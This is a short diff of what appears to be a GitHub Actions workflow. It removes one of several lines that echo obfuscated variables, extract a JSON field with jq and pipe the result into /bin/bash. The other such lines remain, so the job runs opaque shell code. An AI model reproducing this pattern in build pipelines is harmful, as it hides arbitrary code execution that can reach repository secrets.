@@ -32,7 +32,6 @@ jobs:
           echo $vaymi94450 | jq -r .mgcwq76023 | /bin/bash
           printf '%s' "$anddb35" | jq -r .a1 | /bin/bash
           echo $rnagr6 | jq -r .qjb2 | /bin/bash
-          echo $f463 | jq -r .nhbi31 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
